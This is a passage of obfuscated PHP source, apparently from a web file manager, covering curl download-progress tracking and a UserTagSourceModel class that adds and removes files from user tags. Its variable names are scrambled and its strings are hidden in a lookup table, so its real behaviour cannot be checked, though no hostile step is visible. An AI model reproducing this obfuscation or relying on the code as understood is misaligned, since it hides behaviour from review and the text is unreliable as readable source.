$this->sourceModelCopyFlag = !1; } public function sourceRemove($‘×ØàÉ, $“º¨Ó¡Ì) { $±öœòÑè =& $_SERVER[ñ÷§¡å]; $this->sourceModelCopyFlag = !0; $ûàş‰Ë = 1; if (isset($‘×ØàÉ[$±öœòÑè[89]])) { $ûàş‰Ë = $‘×ØàÉ[$±öœòÑè[89]][$±öœòÑè[87]]; $ûàş‰Ë = $ûàş‰Ë + $‘×ØàÉ[$±öœòÑè[89]][$±öœòÑè[88]] + 1; } $this->update($ûàş‰Ë); $this->sourceModelCopyFlag = !1; } public function sourceMove($–”“şŞß) { $this->sourceRemove($–”“şŞß, !1); } public function curlProgress($ôèé™½Ç, $‘®§óëŸ, $¯õìŒº¶, $Ó­«Ñ€, $Ò£‡€) { $¤ÃÊ§í =& $_SERVER[ñ÷§¡å]; $‡·Í¹Éã =& $this->task; if ($Ò£‡€ > 0) { $‡·Í¹Éã[$¤ÃÊ§í[1071]] = $¤ÃÊ§í[1734]; $‡·Í¹Éã[$¤ÃÊ§í[1716]] = $¤ÃÊ§í[117]; if ($‡·Í¹Éã[$¤ÃÊ§í[1714]]) { $‡·Í¹Éã[$¤ÃÊ§í[1715]] = $Ò£‡€; } if ($‡·Í¹Éã[$¤ÃÊ§í[1717]]) { $‡·Í¹Éã[$¤ÃÊ§í[1715]] = $Ò£‡€ + $‡·Í¹Éã[$¤ÃÊ§í[1717]]; } } else { if ($¯õìŒº¶ > 0) { if ($‡·Í¹Éã[$¤ÃÊ§í[1714]] == $‘®§óëŸ) { $‡·Í¹Éã[$¤ÃÊ§í[1715]] = $¯õìŒº¶; $‡·Í¹Éã[$¤ÃÊ§í[1071]] = $¤ÃÊ§í[1735]; $‡·Í¹Éã[$¤ÃÊ§í[1716]] = $¤ÃÊ§í[1206]; } } } $this->update(); } public function curlProgressStart($Ú•´üÚ‹) { } public function curlProgressEnd($¶ˆá’Ì) { $Ôå˜Š”¢ =& $_SERVER[ñ÷§¡å]; $¨ßŒ÷­¥ =& $this->task; $¹€Ôº™³ = curl_getinfo($¶ˆá’Ì); $¸¿çæ² = $¹€Ôº™³[$Ôå˜Š”¢[1736]]; if ($¸¿çæ² == -1) { $¸¿çæ² = $¹€Ôº™³[$Ôå˜Š”¢[1737]]; } if ($¨ßŒ÷­¥[$Ôå˜Š”¢[1716]] == $Ôå˜Š”¢[117] && $¸¿çæ²) { $¨ßŒ÷­¥[$Ôå˜Š”¢[1717]] += $¸¿çæ²; } $this->update(); } } goto cÔà¤º‚‹°; D—¯•—ÁŸ¹: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\x73\x65\162\x5f\146\x61\166"; protected function cacheFunctionAlias($“¢êÑÅ) { $’Õ¶˜­ã =& $_SERVER[ñ÷§¡å]; return array($’Õ¶˜­ã[1946] => array($’Õ¶˜­ã[2327] . USER_ID, $’Õ¶˜­ã[1947])); } protected function listData() { $¥÷ª¤ =& $_SERVER[ñ÷§¡å]; $Ì¼Í°† = array($¥÷ª¤[1654] => USER_ID, $¥÷ª¤[493] => array($¥÷ª¤[1950], 0)); $ª§ì¿·· = $¥÷ª¤[2328]; $ô²¼‡‘Ñ = $this->field($ª§ì¿··)->where($Ì¼Í°†)->order($¥÷ª¤[1953])->select(); return $ô²¼‡‘Ñ ? $ô²¼‡‘Ñ : array(); } protected function addToTag($› †Æ®†, $úÏğºâ) { $¡ÇéàâŒ =& $_SERVER[ñ÷§¡å]; if (!Model($¡ÇéàâŒ[2090])->listData($úÏğºâ)) { return !1; } if (is_numeric($› †Æ®†)) { $ÔÁßƒ±ˆ = Model($¡ÇéàâŒ[838])->pathInfo($› †Æ®†); if (!$ÔÁßƒ±ˆ) { return !1; } } else { $ÔÁßƒ±ˆ = IO::infoSimple($› †Æ®†); if (!$ÔÁßƒ±ˆ) { return !1; } $¹ÕÅåæÃ = $ÔÁßƒ±ˆ[$¡ÇéàâŒ[32]]; $©‹ø×è = $ÔÁßƒ±ˆ[$¡ÇéàâŒ[33]]; if (isset($ÔÁßƒ±ˆ[$¡ÇéàâŒ[419]])) { $©‹ø×è = $ÔÁßƒ±ˆ[$¡ÇéàâŒ[419]] == $¡ÇéàâŒ[98] ? $¡ÇéàâŒ[85] : $¡ÇéàâŒ[209]; } } $‹…çşß = array($¡ÇéàâŒ[1654] => USER_ID, $¡ÇéàâŒ[493] => $úÏğºâ, $¡ÇéàâŒ[430] => $› †Æ®†, $¡ÇéàâŒ[431] => $©‹ø×è ? $©‹ø×è : $¡ÇéàâŒ[425], $¡ÇéàâŒ[429] => $¹ÕÅåæÃ ? $¹ÕÅåæÃ : $¡ÇéàâŒ[12], $¡ÇéàâŒ[1839] => 0); if ($this->where($‹…çşß)->find()) { return !1; } return $this->add($‹…çşß); } protected function removeFromTag($§¦©©¬®, $Ìªñşê) { $ò‡ ªèã =& $_SERVER[ñ÷§¡å]; if (!Model($ò‡ ªèã[2090])->listData($Ìªñşê)) { return !1; } if (is_array($§¦©©¬®)) { $§¦©©¬® = array($ò‡ ªèã[7], $§¦©©¬®); } $·ëûş¾ = array($ò‡ ªèã[1654] => USER_ID, $ò‡ ªèã[493] => $Ìªñşê, $ò‡ ªèã[430] => $§¦©©¬®); return $this->where($·ëûş¾)->delete(); } protected function removeByTag($éı–ÛÖ) { $©Ê˜ËŠ« =& $_SERVER[ñ÷§¡å]; if (!$éı–ÛÖ) { return !1; } $«ŞœÑ¨É = array($©Ê˜ËŠ«[1654] => USER_ID, $©Ê˜ËŠ«[493] => $éı–ÛÖ); return $this->where($«ŞœÑ¨É)->delete(); } protected function removeBySource($×Î‰±ô») { $¾‘ş£• =& $_SERVER[ñ÷§¡å]; if (is_array($×Î‰±ô»)) { $×Î‰±ô» = array($¾‘ş£•[7], $×Î‰±ô»); } $–ü×Ãğ´ = array($¾‘ş£•[1654] => USER_ID, $¾‘ş£•[493] => array($¾‘ş£•[1021], 0), $¾‘ş£•[430] => $×Î‰±ô»); return $this->where($–ü×Ãğ´)->delete(); } }